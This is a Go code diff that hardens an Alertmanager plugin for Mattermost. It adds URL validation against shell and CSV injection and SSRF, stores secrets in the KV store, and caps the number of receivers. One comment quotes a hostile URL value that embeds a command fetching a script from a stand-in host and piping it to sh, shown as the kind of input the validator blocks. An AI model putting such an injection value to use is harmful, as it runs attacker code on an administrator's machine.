@@ -4,16 +4,25 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+	"net"
 	neturl "net/url"
 	"regexp"
+	"strconv"
 	"strings"
 	"time"
+
+	"github.com/mattermost/mattermost-plugin-alertmanager/server/alertmanager"
 )
 
-// rawConfiguration is what Mattermost's settings framework fills in. The
-// AlertConfigsJSON field is the JSON-serialized array of alertConfig entries.
-// Slash commands are the primary write path; the System Console field is the
-// bulk-edit / GitOps fallback.
+// rawConfiguration is what Mattermost's settings framework fills in from the
+// plugin's System Console settings_schema.
+//
+// The receiver list (alertConfig entries) is deliberately NOT here: it holds
+// webhook IDs and Alertmanager basic-auth passwords, and anything in the plugin
+// config map is readable via GET /api/v4/config by delegated console roles
+// (sysconsole_read_plugins) unless flagged secret. It lives in the plugin KV
+// store instead (kvKeyAlertConfigs), which the config API does not expose. See
+// loadAlertConfigsFromKV (read) and updateConfigsAtomic (write) (CL-19).
 //
 // WebhookHost is the optional override for the host:port portion of the
 // Mattermost webhook URL when rendered into alertmanager.yml. See
@@ -26,13 +35,57 @@ import (
 // free-text WebhookHost always wins, so existing installs and custom URLs
 // are unaffected.
 type rawConfiguration struct {
-	AlertConfigsJSON      string
-	WebhookHost           string
-	WebhookHostPreset     string
-	AssembledYAMLTTLHours int
-	AlertManagerCABundle  string
-	MetricsToken          string
-	WebhookRotationDays   int
+	WebhookHost              string
+	WebhookHostPreset        string
+	AssembledYAMLTTLHours    int
+	AlertManagerCABundle     string
+	AlertManagerAllowedCIDRs string
+	MetricsToken             string
+	WebhookRotationDays      int
+}
+
+// toConfigMap renders every settings_schema field as the lowercased-key map that
+// SavePluginConfig expects. Callers that persist ONE setting (e.g. the
+// metrics-token command) must preserve all the others — SavePluginConfig replaces
+// the whole map — so they build from here. Keeping this next to the struct means
+// a new setting is added in one obvious place instead of silently dropped by a
+// stale key list in a distant file. Guarded by TestRawConfigMapCoversSchema.
+func (r rawConfiguration) toConfigMap() map[string]any {
+	return map[string]any{
+		"webhookhost":              r.WebhookHost,
+		"webhookhostpreset":        r.WebhookHostPreset,
+		"assembledyamlttlhours":    r.AssembledYAMLTTLHours,
+		"alertmanagercabundle":     r.AlertManagerCABundle,
+		"alertmanagerallowedcidrs": r.AlertManagerAllowedCIDRs,
+		"metricstoken":             r.MetricsToken,
+		"webhookrotationdays":      r.WebhookRotationDays,
+	}
+}
+
+// kvKeyAlertConfigs is the plugin KV-store key holding the JSON-serialized
+// receiver list. The KV store is not surfaced by GET /api/v4/config, so the
+// webhook IDs and Alertmanager passwords in these entries are not readable by
+// delegated console roles the way a plugin-config value would be (CL-19). The
+// :v1 suffix leaves room to change the on-disk shape without a key collision.
+const kvKeyAlertConfigs = "alertconfigs:v1"
+
+// maxReceivers caps the total number of registered receivers across the whole
+// install (CL-25). Every write re-marshals and re-validates the entire list, and
+// each entry re-verifies its team on the next config change — so an unbounded
+// list turns each subsequent write into an O(N) tax (O(N^2) to build up), bloats
+// the cluster-broadcast KV value, and slows the reconciler. Set far above any
+// real deployment (30 runbooks across a generous channel count) so genuine use
+// never hits it, but a scripted flood is stopped. Enforced in the add path.
+const maxReceivers = 2000
+
+// enforceReceiverCap returns an error when appending `adding` receivers to a list
+// that already holds `existing` would exceed maxReceivers (CL-25). Called inside
+// the add transforms so the check runs against the freshly-read KV count.
+func enforceReceiverCap(existing, adding int) error {
+	if existing+adding > maxReceivers {
+		return fmt.Errorf("receiver limit reached (%d registered, cap %d) — remove some before adding more", existing, maxReceivers)
+	}
+	return nil
 }
 
 // configuration is the parsed, validated, ready-to-serve plugin state.
@@ -107,8 +160,10 @@ type alertConfig struct {
 	// REST API (used by /alertmanager alerts, silences, status). Not a
 	// Mattermost user — these are service-account credentials for the
 	// Alertmanager side. Leave empty unless your Alertmanager is behind an
-	// auth proxy. NOT exposed via the /alertmanager add slash command;
-	// set via System Console JSON edit if needed.
+	// auth proxy. NOT exposed via the /alertmanager add slash command. Since
+	// CL-19 moved the receiver list to the KV store, the old config-JSON edit
+	// path is gone; setting these now means writing the KV entry directly.
+	// A dedicated slash flag is a possible future addition.
 	User     string `json:"user,omitempty"`
 	Password string `json:"password,omitempty"`
 
@@ -165,6 +220,15 @@ func (ac *alertConfig) IsValid() error {
 	if (ac.User == "") != (ac.Password == "") {
 		return errors.New("user and password must both be set or both be empty")
 	}
+	// CL-03/CL-21/CL-33: validate the URLs here so EVERY persist path — slash
+	// command and a blob written straight to the KV store — is covered, not just
+	// the /alertmanager add entry point.
+	if err := validateAlertManagerURL(ac.AlertManagerURL); err != nil {
+		return err
+	}
+	if err := validateWebhookHost(ac.WebhookHostOverride); err != nil {
+		return fmt.Errorf("webhookHostOverride: %w", err)
+	}
 	return nil
 }
 
@@ -202,6 +266,115 @@ func (c *configuration) Clone() *configuration {
 // configMutex guards getConfiguration / setConfiguration. Embedded in Plugin
 // rather than here to keep this file focused on the data model.
 
+// alertManagerHostRegex matches the host of a legitimate Alertmanager base URL:
+// a hostname or IP (IPv6 colons allowed; url.Hostname strips the brackets),
+// nothing else. It deliberately excludes every shell metacharacter ($ ( ) ` ; |
+// & and whitespace), which is what neutralizes a value like
+// `http://am:9093$(curl${IFS}-s${IFS}http://evil|sh)` — that survives
+// strings.Fields via ${IFS} and would otherwise be interpolated verbatim into
+// the copy-paste `curl -X POST <url>/-/reload` fence and the CSV export (CL-03,
+// CL-21).
+var alertManagerHostRegex = regexp.MustCompile(`^[A-Za-z0-9.:-]+$`)
+
+// alertManagerPathRegex restricts an optional reverse-proxy path prefix to a
+// safe charset, so the path can't smuggle shell metacharacters into the reload
+// command fence either.
+var alertManagerPathRegex = regexp.MustCompile(`^[A-Za-z0-9._~/%-]+$`)
+
+// validateAlertManagerURL rejects a malformed or dangerous AlertManagerURL. The
+// value is attacker-influenceable (a team_admin sets it via /alertmanager add)
+// and later renders into a copy-paste shell command a sysadmin runs and into a
+// CSV a sysadmin opens — a cross-privilege, cross-context sink. Empty is valid
+// (the URL is only needed for the alerts/silences/status commands).
+//
+// Accepted: http[s]://host[:port][/safe/path]. Rejected: other schemes, embedded
+// credentials, query strings, fragments, and any character in the host or path
+// outside the safe grammar above (which is where the shell/CSV injection lives).
+func validateAlertManagerURL(raw string) error {
+	raw = strings.TrimSpace(raw)
+	if raw == "" {
+		return nil
+	}
+	// Reject '?' and '#' via a STRING scan, BEFORE parsing — deliberately, not
+	// via u.RawQuery/u.Fragment. url.Parse("http://h/x#") reports RawQuery=="" and
+	// Fragment=="" for a TRAILING bare marker, so a component-only check misses it,
+	// yet the plugin builds requests by concatenation (amURL + "/api/v2/alerts"),
+	// so that trailing '#'/'?' silently truncates the appended path onto the wrong
+	// endpoint. A base URL never legitimately carries either. (F-002, from PR #58's
+	// review — kept alongside #57's stricter host/port/path grammar below.)
+	if strings.ContainsAny(raw, "?#") {
+		return errors.New("AlertManagerURL must not contain '?' or '#' — even a trailing one truncates the appended /api/v2/... path")
+	}
+	u, err := neturl.Parse(raw)
+	if err != nil {
+		return fmt.Errorf("AlertManagerURL is not a valid URL: %w", err)
+	}
+	if u.Scheme != "http" && u.Scheme != "https" {
+		return fmt.Errorf("AlertManagerURL must use http:// or https:// (got %q)", u.Scheme)
+	}
+	if u.User != nil {
+		return fmt.Errorf("AlertManagerURL must not contain embedded credentials")
+	}
+	host := u.Hostname()
+	if host == "" {
+		return fmt.Errorf("AlertManagerURL has no host")
+	}
+	// SSRF check for a literal-IP host (F-001), allowlist-aware via the SAME
+	// decision the dial guard uses (F-006: an allowlisted loopback/private literal
+	// must save, not just dial). Hostnames are validated at dial time (post-DNS,
+	// authoritative, rebinding-safe) — see the alertmanager dial guard.
+	if ip := net.ParseIP(host); ip != nil {
+		if err := alertmanager.CheckDestinationIP(ip); err != nil {
+			return fmt.Errorf("AlertManagerURL %q is a blocked destination: %w", host, err)
+		}
+	}
+	if !alertManagerHostRegex.MatchString(host) {
+		return fmt.Errorf("AlertManagerURL host contains invalid characters")
+	}
+	if port := u.Port(); port != "" {
+		if _, err := strconv.Atoi(port); err != nil {
+			return fmt.Errorf("AlertManagerURL has a non-numeric port")
+		}
+	}
+	// Query/fragment already rejected by the string scan above (which also
+	// catches trailing bare markers a parsed check would miss).
+	if u.Path != "" && u.Path != "/" && !alertManagerPathRegex.MatchString(u.Path) {
+		return fmt.Errorf("AlertManagerURL path contains invalid characters")
+	}
+	return nil
+}
+
+// sanitizeAlertManagerURL is the LOAD-PATH counterpart to
+// validateAlertManagerURL: it neuters a stored Alertmanager URL instead of
+// rejecting it. Strips surrounding whitespace, the '?'/'#' tail (and everything
+// after — the exploitable path-truncation vector), and any embedded credentials.
+//
+// Why neuter, not reject, on load: parseAlertConfigs's error propagates out of
+// OnConfigurationChange, and an error there stops the plugin loading AT ALL. So
+// a single bad stored value (a direct KV write, or a bug that slipped one past
+// the /alertmanager add validation) would brick the whole plugin — turning F-002
+// into a persistent denial of service. Sanitizing keeps the plugin up; the one
+// affected receiver's alerts/status/silences queries stop working, which is a far
+// smaller blast radius than a dead plugin. (F-002 hardening, from PR #58's review.)
+//
+// Anything sanitize can't rescue (no scheme, no host) is left for the caller to
+// blank — it's inert (http.Client.Do fails on it, no SSRF value), not hostile.
+func sanitizeAlertManagerURL(raw string) string {
+	raw = strings.TrimSpace(raw)
+	// Drop the '?'/'#' tail first so the exploitable truncation vector is gone
+	// even if the remainder doesn't parse as a URL.
+	if i := strings.IndexAny(raw, "?#"); i >= 0 {
+		raw = raw[:i]
+	}
+	u, err := neturl.Parse(raw)
+	if err != nil || u.User == nil {
+		return raw
+	}
+	// Strip embedded credentials (basic-auth belongs in the user/password fields).
+	u.User = nil
+	return u.String()
+}
+
 // validateWebhookHost rejects malformed WebhookHost values at config
 // save time. Sanity-checks defense-in-depth — sysadmins are trusted,
 // but typos shouldn't propagate to alertmanager.yml.
@@ -213,6 +386,15 @@ func validateWebhookHost(raw string) error {
 	if raw == "" {
 		return nil
 	}
+	// WebhookHost is a SECOND team-admin-controllable URL (per-receiver via
+	// --webhook-host, or the global setting): it drives a server-side webhook-test
+	// POST AND is concatenated into generated `api_url:` YAML/CRD/export. So it must
+	// meet the SAME bar as validateAlertManagerURL — reject embedded credentials,
+	// literal-IP SSRF targets, YAML-breaking hostnames, and trailing '?'/'#' — or it
+	// re-opens the exact SSRF/injection surface the AM-URL hardening closed.
+	if strings.ContainsAny(raw, "?#") {
+		return errors.New("WebhookHost must not contain '?' or '#' — even a trailing one truncates the appended /hooks/... path")
+	}
 	u, err := neturl.Parse(raw)
 	if err != nil {
 		return fmt.Errorf("WebhookHost is not a valid URL: %w", err)
@@ -220,14 +402,35 @@ func validateWebhookHost(raw string) error {
 	if u.Scheme != "http" && u.Scheme != "https" {
 		return fmt.Errorf("WebhookHost must use http:// or https:// (got %q)", u.Scheme)
 	}
-	if u.Host == "" {
-		return fmt.Errorf("WebhookHost has no host portion")
+	// Reject embedded creds (http://user:pass@host): they would persist into the
+	// generated api_url YAML/CRD, the DM'd export, and the webhook-test URL.
+	if u.User != nil {
+		return errors.New("WebhookHost must not contain embedded credentials")
+	}
+	host := u.Hostname()
+	if host == "" {
+		return errors.New("WebhookHost has no host portion")
+	}
+	// SSRF check for a literal-IP host, allowlist-aware via the SAME decision the
+	// dial guard uses — so --webhook-host=http://169.254.169.254 (cloud metadata)
+	// or a non-allowlisted private IP is rejected at save, not just at dial.
+	if ip := net.ParseIP(host); ip != nil {
+		if err := alertmanager.CheckDestinationIP(ip); err != nil {
+			return fmt.Errorf("WebhookHost %q is a blocked destination: %w", host, err)
+		}
+	}
+	// Safe host grammar: blocks quotes and other YAML-breaking characters that a
+	// single quote in `api_url: '<host>/hooks/...'` would otherwise inject with.
+	if !alertManagerHostRegex.MatchString(host) {
+		return errors.New("WebhookHost host contains invalid characters")
+	}
+	if port := u.Port(); port != "" {
+		if _, err := strconv.Atoi(port); err != nil {
+			return errors.New("WebhookHost has a non-numeric port")
+		}
 	}
 	if u.Path != "" && u.Path != "/" {
 		return fmt.Errorf("WebhookHost must be a host:port only, no path (got %q)", u.Path)
-	}
-	if u.RawQuery != "" || u.Fragment != "" {
-		return fmt.Errorf("WebhookHost cannot contain query string or fragment")
 	}
 	return nil
 }
@@ -282,7 +485,21 @@ func parseAlertConfigs(blob string) ([]alertConfig, error) {
 	}
 	seenWebhooks := make(map[string]webhookOwner, len(entries))
 	for i := range entries {
-		entries[i].AlertManagerURL = strings.TrimRight(entries[i].AlertManagerURL, "/")
+		// Sanitize the Alertmanager URL BEFORE IsValid so a hostile or malformed
+		// stored value is neutered, never rejected. IsValid (below) runs on the
+		// load path, and any error it returns propagates out of
+		// OnConfigurationChange and stops the plugin loading at all — so a single
+		// bad stored URL must not fail the load, or F-002 becomes a persistent DoS.
+		// Sanitize strips the exploitable parts; anything still failing the strict
+		// validateAlertManagerURL check afterwards (no scheme / no host) is inert,
+		// not hostile, so blank it. The /alertmanager add + add-custom entry points
+		// still HARD-reject bad input up front, so this only fires on values that
+		// bypassed them (direct KV write, future bug). (F-002, from PR #58's review.)
+		amURL := strings.TrimRight(sanitizeAlertManagerURL(entries[i].AlertManagerURL), "/")
+		if amURL != "" && validateAlertManagerURL(amURL) != nil {
+			amURL = ""
+		}
+		entries[i].AlertManagerURL = amURL
 		if err := entries[i].IsValid(); err != nil {
 			return nil, fmt.Errorf("alertConfig[%d]: %w", i, err)
 		}
@@ -301,8 +518,12 @@ func parseAlertConfigs(blob string) ([]alertConfig, error) {
 		}
 		if existing, seen := seenWebhooks[entries[i].WebhookID]; seen {
 			if existing != owner {
-				return nil, fmt.Errorf("alertConfig[%d] name=%q: webhookID %q is shared with a receiver in team=%q channel=%q group=%q; sharing requires matching team+channel+group (got team=%q channel=%q group=%q)",
-					i, entries[i].Name, entries[i].WebhookID,
+				// Redact the webhook ID (a bearer token) — this error surfaces to the
+				// admin and the logs (CL-13). The conflict is already identifiable by
+				// name + team/channel/group; the fingerprint just correlates the two
+				// entries that collide.
+				return nil, fmt.Errorf("alertConfig[%d] name=%q: webhook %s is shared with a receiver in team=%q channel=%q group=%q; sharing requires matching team+channel+group (got team=%q channel=%q group=%q)",
+					i, entries[i].Name, redactHookID(entries[i].WebhookID),
 					existing.team, existing.channel, existing.group,
 					owner.team, owner.channel, owner.group)
 			}
@@ -312,6 +533,59 @@ func parseAlertConfigs(blob string) ([]alertConfig, error) {
 		seenNames[entries[i].Name] = struct{}{}
 	}
 	return entries, nil
+}
+
+// loadAlertConfigsFromKV reads and validates the receiver list from the plugin
+// KV store (CL-19). An absent key (fresh install, or nothing added yet) is not
+// an error — it returns an empty list. Parse/validation errors ARE surfaced so a
+// corrupt blob fails the config swap loudly rather than silently dropping
+// receivers.
+//
+// Intentional clean break, NOT a bug: the receiver list moved from the plugin
+// config map to the KV store with NO migration reader. An install upgrading from
+// a config-map build therefore comes up with an empty list and re-adds its
+// receivers via /alertmanager add. This is a deliberate dev/redeploy boundary
+// (see the BREAKING CHANGE note and docs/CONFIGURATION.md); a migration shim was
+// explicitly out of scope. Do not "fix" this by reading the old config value.
+// clusterEventReloadConfigs is the plugin-cluster event ID that tells peer nodes
+// to reload the receiver list from KV. KV writes are cluster-consistent, but they
+// do NOT fire OnConfigurationChange on other nodes — so without this broadcast a
+// peer keeps serving a stale in-memory receiver list after another node writes
+// (add/remove/rotate/reconcile). See broadcastConfigReload + OnPluginClusterEvent.
+const clusterEventReloadConfigs = "reload_alertconfigs"
+
+// applyAlertConfigsToMemory swaps the in-memory receiver list to `configs`,
+// preserving the config-map-backed settings (WebhookHost, TTL, CA bundle, metrics
+// token, rotation days) — those sync independently via OnConfigurationChange.
+// Shared by the writing node (post-commit) and peers (on cluster event) so both
+// refresh identically.
+func (p *Plugin) applyAlertConfigsToMemory(configs []alertConfig) {
+	cur := p.getConfiguration()
+	p.setConfiguration(newConfiguration(configs, cur.WebhookHost, cur.AssembledYAMLTTLHours, cur.AlertManagerCABundle, cur.MetricsToken, cur.WebhookRotationDays))
+}
+
+// reloadAlertConfigsFromKV re-reads the receiver list from KV and swaps it into
+// the in-memory config. Called on peers when they receive a
+// clusterEventReloadConfigs broadcast, so a write on one node becomes visible to
+// list/export/scope-checks/reconcile on every node — not just the writer.
+func (p *Plugin) reloadAlertConfigsFromKV() error {
+	configs, err := p.loadAlertConfigsFromKV()
+	if err != nil {
+		return err
+	}
+	p.applyAlertConfigsToMemory(configs)
+	return nil
+}
+
+func (p *Plugin) loadAlertConfigsFromKV() ([]alertConfig, error) {
+	data, appErr := p.API.KVGet(kvKeyAlertConfigs)
+	if appErr != nil {
+		return nil, fmt.Errorf("read receiver list from KV: %w", appErr)
+	}
+	if len(data) == 0 {
+		return nil, nil
+	}
+	return parseAlertConfigs(string(data))
 }
 
 // configurationLock-aware helpers live on *Plugin.
@@ -340,30 +614,64 @@ func (p *Plugin) OnConfigurationChange() error {
 		return err
 	}
 
-	entries, err := parseAlertConfigs(raw.AlertConfigsJSON)
-	if err != nil {
-		return err
-	}
+	// Install the SSRF destination allowlist BEFORE loading the receiver list, so
+	// the load-time URL validation below (which consults it, F-006) sees the
+	// current allowlist and doesn't blank an allowlisted loopback/private URL.
+	p.updateAlertmanagerAllowlist(raw.AlertManagerAllowedCIDRs)
 
+	// Load the receiver list from KV and swap the config under configWriteMu, so
+	// this can't interleave with a concurrent local updateConfigsAtomic and clobber
+	// a newer write with an older snapshot (F-003). KVGet needs a live API, so skip
+	// it during early startup / tests. Team verification (network calls) runs AFTER
+	// the lock is released — it's log-only, so it doesn't affect the swap.
+	var entries []alertConfig
+	p.configWriteMu.Lock()
 	if p.API != nil {
-		for _, ac := range entries {
-			_, appErr := p.API.GetTeamByName(ac.Team)
-			if appErr == nil {
-				continue
-			}
-			// Tolerate transient errors (typically during early startup
-			// before the API is fully ready). Hard-fail only on real 404s.
-			if appErr.StatusCode == 404 {
-				return fmt.Errorf("alertConfig %q: Mattermost team %q does not exist", ac.Name, ac.Team)
-			}
-			p.API.LogWarn("could not verify team existence (continuing)", "config", ac.Name, "team", ac.Team, "err", appErr.Error())
+		loaded, err := p.loadAlertConfigsFromKV()
+		if err != nil {
+			// Do NOT brick the plugin over an unreadable/invalid KV blob (F-005):
+			// keep the last-known in-memory receiver list and still apply the
+			// config-map settings, so the plugin stays up and remains operable. We
+			// never write KV here, so the bad value is left intact for inspection.
+			p.API.LogError("receiver list in KV is unreadable; keeping last-known list and applying settings only", "err", err.Error())
+			entries = p.getConfiguration().AlertConfigs
+		} else {
+			entries = loaded
 		}
 	}
-
 	p.setConfiguration(newConfiguration(entries, effectiveHost, raw.AssembledYAMLTTLHours, raw.AlertManagerCABundle, raw.MetricsToken, raw.WebhookRotationDays))
+	p.configWriteMu.Unlock()
+
+	// Best-effort team verification, OUTSIDE the lock (these are network calls we
+	// don't want to hold configWriteMu across) and log-only: a since-deleted team
+	// must not brick the load (F-005) — the affected receiver is just orphaned and
+	// handled at command time. Save-time (/alertmanager add) still rejects unknown
+	// teams up front.
+	if p.API != nil {
+		p.verifyTeamsExist(entries)
+	}
+
 	// Refresh the alertmanager package's HTTP client to use the new
 	// CA bundle (if set). Applied on every config change so admins
 	// can rotate certificates without a plugin restart.
 	p.updateAlertmanagerHTTPClient(raw.AlertManagerCABundle)
 	return nil
+}
+
+// verifyTeamsExist logs a warning for any receiver whose Mattermost team no
+// longer exists. Best-effort and log-only (never fails the config load — F-005).
+// Each DISTINCT team is checked once and marked seen BEFORE the lookup, so a
+// transient API error during a Mattermost outage can't turn into an O(N) RPC/log
+// storm across receivers that share a team (CL-25).
+func (p *Plugin) verifyTeamsExist(entries []alertConfig) {
+	verifiedTeams := make(map[string]bool)
+	for _, ac := range entries {
+		if verifiedTeams[ac.Team] {
+			continue
+		}
+		verifiedTeams[ac.Team] = true
+		if _, appErr := p.API.GetTeamByName(ac.Team); appErr != nil {
+			p.API.LogWarn("could not verify team existence (receiver may be orphaned)", "config", ac.Name, "team", ac.Team, "err", appErr.Error())
+		}
+	}
 }
